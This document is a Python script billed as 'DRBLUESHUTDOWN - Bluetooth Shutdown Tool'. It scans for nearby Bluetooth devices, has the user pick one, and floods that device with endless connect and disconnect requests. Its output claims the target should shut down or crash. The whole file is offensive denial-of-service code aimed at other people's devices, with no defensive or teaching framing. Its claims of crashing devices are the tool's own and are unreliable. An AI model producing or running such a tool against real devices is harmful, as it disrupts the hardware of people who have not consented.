#!/usr/bin/env python3
import subprocess
import time
import sys

LOGO = r"""
  ═╦═───────────────────────────────────────────────────────═╦═
  ║   ▓█████▄   ██▀███   ▄▄▄▄    ██▓     █    ██ ▓█████     ║
  ║   ▒██▀ ██▌ ▓██ ▒ ██▒▓█████▄ ▓██▒     ██  ▓██▒▓█   ▀     ║
  ║   ░██   █▌ ▓██ ░▄█ ▒▒██▒ ▄██▒██░    ▓██  ▒██░▒███       ║
  ║   ░▓█▄   ▌ ▒██▀▀█▄  ▒██░█▀  ▒██░    ▓██  ░██ ▒▓█  ▄     ║
  ║   ░▒████▓  ░██▓ ▒██▒░▓█  ▀█▓░██████▒▒███████▒░▒████▒    ║
  ║    ▒▒▓  ▒  ░ ▒▓ ░▒▓░░▒▓███▀▒░ ▒░▓  ░▒ ▒ ▒ ▒ ░░ ▒░ ░    ║
 ═╩═───────────────────────────────────────────────────────═╩═

        .-""-.
       /      \
      |  o  o  |
      |   __   |
       \______/

"""

def get_devices():
    print("[+] Scanning for Bluetooth devices...")

    subprocess.run(['bluetoothctl', 'power', 'on'], capture_output=True)
    subprocess.run(['hciconfig', 'hci0', 'up'], capture_output=True)
    subprocess.run(['bluetoothctl', 'agent', 'NoInputNoOutput'], capture_output=True)
    subprocess.run(['bluetoothctl', 'default-agent'], capture_output=True)

    scan_proc = subprocess.Popen(['bluetoothctl', 'scan', 'on'],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(15)
    scan_proc.terminate()
    scan_proc.wait()

    result = subprocess.run(['bluetoothctl', 'devices'], capture_output=True, text=True)
    devices = []
    for line in result.stdout.strip().split('\n'):
        if line.startswith('Device'):
            parts = line.split()
            if len(parts) >= 3:
                addr = parts[1]
                name = ' '.join(parts[2:])
                devices.append((addr, name))

    return devices

def spam_device(addr):
    print(f"[+] Starting shutdown flood against {addr}...")
    count = 0
    try:
        while True:
            connect_cmd = f"connect {addr}"
            p1 = subprocess.run(['bluetoothctl', connect_cmd],
                              input=b"y\n", timeout=3, capture_output=True)

            disconnect_cmd = f"disconnect {addr}"
            subprocess.run(['bluetoothctl', disconnect_cmd],
                          capture_output=True)

            count += 1
            if count % 10 == 0:
                print(f"[>] Sent {count} packets - Device should be shutting down...", end='\r')
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    finally:
        print(f"\n[+] Total packets sent: {count}")
        print("[+] Target device should now be disconnected or crashed.")

if __name__ == "__main__":
    print(LOGO)
    print("="*40)
    print("  DRBLUESHUTDOWN - Bluetooth Shutdown Tool")
    print("="*40)

    devices = get_devices()
    if not devices:
        print("[-] No devices found.")
        sys.exit(1)

    print(f"[+] Found {len(devices)} device(s):")
    for i, (addr, name) in enumerate(devices):
        print(f"   [{i}] {name} - {addr}")

    choice = input("\n[*] Select device index to SHUTDOWN: ")
    idx = int(choice)
    if 0 <= idx < len(devices):
        addr, name = devices[idx]
        spam_device(addr)
